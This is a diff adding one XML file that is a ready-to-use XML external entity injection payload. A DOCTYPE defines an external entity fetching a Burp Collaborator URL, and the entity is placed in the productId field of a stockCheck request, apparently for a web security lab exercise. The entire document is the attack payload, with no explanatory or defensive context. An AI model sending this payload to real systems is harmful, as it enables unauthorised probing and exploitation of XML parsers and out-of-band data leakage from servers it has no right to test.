@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE foo [
+
+<!ENTITY test SYSTEM "http://burpcollaborator/x">
+
+]>
+
+<stockCheck><productId>&test; </productId><storeId>1</storeId></stockCheck>
